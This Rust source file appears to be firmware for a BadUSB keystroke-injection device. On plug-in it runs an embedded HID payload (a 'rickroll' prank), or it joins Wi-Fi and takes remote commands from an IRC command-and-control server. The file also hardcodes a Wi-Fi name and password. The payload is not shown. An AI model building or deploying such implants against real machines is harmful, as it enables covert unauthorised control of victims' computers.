use std::env;
use std::path::PathBuf;
use std::process::exit;
use clap::{Parser, ValueEnum};
use log::warn;
use san_common::hid_actuator::HidActuator;
use crate::actuator::esp_actuator::EspActuator;
use crate::irc_client::irc_client::IRClient;
use crate::irc_client::wifi_handler::WiFiHandler;

const SSID: &str = "quarks11";
const PASS: &str = "1104maja";
const SERVER_ADDR: &str = "192.168.138.131";
const SERVER_PORT: usize = 6667;
const SERVER_NAME: &str = "badusb.test.org";
const CHANNEL_NAME: &str = "#badusb";
const USERNAME: &str = "sanusb";

pub enum SanMode {
    // Autonomous mode where predefined payload will be run at the moment of device mounting
    Auto,
    // Remote mode where the device will try to connect to the remote C&C center, otherwise predefined payload will be run
    Remote,
}

pub fn run(mode: SanMode) {
    match mode {
        SanMode::Auto => {
            run_auto();
        }
        SanMode::Remote => {}
    }
}

fn run_auto() {
    let bytecode = include_bytes!("../../Payloads/windows_rickroll.sanb");
    let mut actuator = EspActuator::new();
    actuator.init_actuator();
    actuator.sleep(3000);
    san_vm::runner::deserialize_bytecode(actuator, bytecode);
}

fn run_remote() {
    let mut wifi = WiFiHandler::new(String::from(SSID), String::from(PASS)).unwrap_or_else(|e| {
        warn!("Error creating wifi handler. Initiating fallback payload...");
        run_auto();
        exit(0);
    });
    wifi.connect_wifi().unwrap_or_else(|e| {
        warn!("Error connecting to wifi. Initiating fallback payload...");
        run_auto();
        exit(0)
    });
    let mut irc = IRClient::new(String::from(SERVER_ADDR),
                                SERVER_PORT,
                                String::from(SERVER_NAME),
                                String::from(CHANNEL_NAME),
                                String::from(USERNAME)).unwrap_or_else(|e| {
        warn!("Error creating wifi handler. Initiating fallback payload...");
        run_auto();
        exit(0);
    });

    match irc.client_loop() {
        Err(e) => {
            warn!("Error while trying to connect to IRC server: {}. Initiating fallback payload...", e.to_string());
            run_auto();
        }
        _ => {}
    }
}